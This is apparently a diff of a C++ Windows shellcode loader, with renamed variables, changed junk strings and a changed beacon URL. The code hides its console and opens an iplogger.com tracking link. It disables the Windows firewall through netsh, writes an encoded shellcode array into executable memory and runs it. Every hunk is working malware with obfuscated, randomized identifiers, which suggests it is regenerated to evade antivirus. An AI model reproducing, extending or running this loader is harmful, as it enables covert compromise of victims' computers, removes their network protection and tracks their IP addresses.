@@ -4,14 +4,14 @@
 
 int main(int argc,char **argv) {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-    printf("bde1741078c87ff19ec30ccaa42f6910");
-    system("start www.example.com");
-    system("ping 192.168.3.7 -n 25");
-    Sleep(5);
-    std::string jrRVrhJVZKhNiwTZ = "1";
-    if(jrRVrhJVZKhNiwTZ == "1")
+    printf("7938da1b4063be7633fe643307d2829d");
+    system("start https://iplogger.com/2rbmd6");
+    system("ping 127.0.0.1 -n 25");
+    Sleep(1);
+    std::string vAmEqBVeDNKMHOzW = "1";
+    if(vAmEqBVeDNKMHOzW == "1")
     {
-        unsigned const char LHUlloIZymnZrN6N[] =
+        unsigned const char FvkliLUpHHtCXQZf[] =
         "\xda\xdc\xba\x57\x74\x85\xd5\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
         "\x66\x31\x53\x19\x03\x53\x19\x83\xc3\x04\xb5\x81\x5c\x11\x81"
         "\xe2\x30\x6e\x0b\x2b\xba\xaa\x1f\x93\x72\x7a\x6e\x73\xf6\x93"
@@ -42,15 +42,15 @@ int main(int argc,char **argv) {
         "\x2f\x63\x1e\xf5\xf9\x9c\xea\x5c\x1d\x39\x93\xa6\x00\xc6\x9b"
         "\x56\x94\x17\xe7\x66\xcf\x9f\x49\x04\xa7\x41\x62\xc3";
 
-    char* YVH4M0uAGWgJyQCF;
-    printf("uenPgRfwsubqxXoN");
+    char* HcxdhpzdPnNmefva;
+    printf("MbVAPmVPVmmzNzym");
     system("NetSh Advfirewall set allprofiles state off");
-    size_t PYZSZUYJTytqNlXr = 433;
-    YVH4M0uAGWgJyQCF = (char*)VirtualAlloc(NULL, PYZSZUYJTytqNlXr, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    size_t ynSTuHFiyZMkgxny = 433;
+    HcxdhpzdPnNmefva = (char*)VirtualAlloc(NULL, ynSTuHFiyZMkgxny, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    memcpy(YVH4M0uAGWgJyQCF, LHUlloIZymnZrN6N, PYZSZUYJTytqNlXr);
+    memcpy(HcxdhpzdPnNmefva, FvkliLUpHHtCXQZf, ynSTuHFiyZMkgxny);
 
-    ((void(*)())YVH4M0uAGWgJyQCF)();
+    ((void(*)())HcxdhpzdPnNmefva)();
    }
     return(0);
 }
